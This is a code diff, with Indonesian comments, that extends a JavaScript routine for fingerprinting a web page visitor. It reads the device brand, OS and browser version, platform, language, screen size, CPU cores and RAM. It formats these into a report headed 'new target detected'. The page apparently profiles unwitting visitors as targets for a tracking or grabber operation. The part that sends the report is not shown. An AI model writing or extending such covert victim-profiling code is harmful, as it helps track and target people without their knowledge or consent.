@@ -17,32 +17,56 @@ async function startProcess() {
     const hardwareConcurrency = navigator.hardwareConcurrency || 'Tidak diketahui';
     const deviceMemory = navigator.deviceMemory || 'Tidak diketahui';
     
-    // Deteksi Nama Perangkat / OS yang lebih rinci dari User Agent
-    let detailedDevice = "Perangkat Tidak Dikenal";
-    
+    // Deteksi Merek / OS Perangkat yang lebih presisi
+    let deviceName = "Perangkat Lainnya";
+    let osVersion = "Tidak diketahui";
+
+    // Deteksi Android & Merek Ponsel
     if (/android/i.test(userAgent)) {
-        detailedDevice = "Android";
-        // Coba deteksi brand populer di Android
-        if (/samsung/i.test(userAgent)) detailedDevice = "Samsung Android";
-        else if (/xiaomi|redmi|poco/i.test(userAgent)) detailedDevice = "Xiaomi / Redmi";
-        else if (/oppo/i.test(userAgent)) detailedDevice = "Oppo";
-        else if (/vivo/i.test(userAgent)) detailedDevice = "Vivo";
-        else if (/realme/i.test(userAgent)) detailedDevice = "Realme";
-        else if (/huawei/i.test(userAgent)) detailedDevice = "Huawei";
-    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
-        detailedDevice = "Apple iOS (iPhone/iPad)";
-    } else if (/win/i.test(platform)) {
-        detailedDevice = "Windows PC";
+        deviceName = "Android Mobile";
+        if (/samsung/i.test(userAgent)) deviceName = "Samsung Galaxy";
+        else if (/redmi|xiaomi|poco/i.test(userAgent)) deviceName = "Xiaomi / Redmi / POCO";
+        else if (/oppo/i.test(userAgent)) deviceName = "Oppo";
+        else if (/vivo/i.test(userAgent)) deviceName = "Vivo";
+        else if (/realme/i.test(userAgent)) deviceName = "Realme";
+        else if (/huawei/i.test(userAgent)) deviceName = "Huawei";
+        else if (/sm-/i.test(userAgent)) deviceName = "Samsung Device";
+
+        // Ambil versi Android
+        let match = userAgent.match(/Android\s([0-9\.]+)/);
+        if (match) osVersion = "Android " + match[1];
+    } 
+    // Deteksi Apple iOS
+    else if (/iphone|ipad|ipod/i.test(userAgent)) {
+        deviceName = "Apple iPhone / iPad";
+        let match = userAgent.match(/OS\s([0-9_\.]+)/);
+        if (match) osVersion = "iOS " + match[1].replace(/_/g, '.');
+    } 
+    // Deteksi Desktop / PC
+    else if (/win/i.test(platform)) {
+        deviceName = "Windows PC";
+        if (/windows nt 10/i.test(userAgent)) osVersion = "Windows 10/11";
+        else if (/windows nt 6.3/i.test(userAgent)) osVersion = "Windows 8.1";
+        else if (/windows nt 6.1/i.test(userAgent)) osVersion = "Windows 7";
     } else if (/mac/i.test(platform)) {
-        detailedDevice = "Apple macOS";
+        deviceName = "Apple macOS";
     } else if (/linux/i.test(platform)) {
-        detailedDevice = "Linux PC";
+        deviceName = "Linux Desktop";
     }
 
+    // Deteksi Jenis Browser
+    let browserName = "Browser Lainnya";
+    if (/chrome|crios/i.test(userAgent) && !/edge|opr/i.test(userAgent)) browserName = "Google Chrome";
+    else if (/safari/i.test(userAgent) && !/chrome|crios/i.test(userAgent)) browserName = "Apple Safari";
+    else if (/firefox|fxios/i.test(userAgent)) browserName = "Mozilla Firefox";
+    else if (/edg/i.test(userAgent)) browserName = "Microsoft Edge";
+    else if (/opr|opera/i.test(userAgent)) browserName = "Opera";
+
     let infoText = `🚨 **TARGET BARU TERDETEKSI (RINCI)** 🚨\n\n` +
-                   `💻 **Jenis OS/Device:** ${detailedDevice}\n` +
-                   `📱 **Platform:** ${platform}\n` +
-                   `🌐 **Bahasa:** ${language}\n` +
+                   `📱 **Merek/Device:** ${deviceName} (${osVersion})\n` +
+                   `🌐 **Browser:** ${browserName}\n` +
+                   `💻 **Platform Sistem:** ${platform}\n` +
+                   `🗣 **Bahasa:** ${language}\n` +
                    `🖥 **Resolusi Layar:** ${screenRes}\n` +
                    `⚙️ **CPU Cores:** ${hardwareConcurrency}\n` +
                    `🧠 **RAM Perangkat:** ~${deviceMemory} GB\n` +
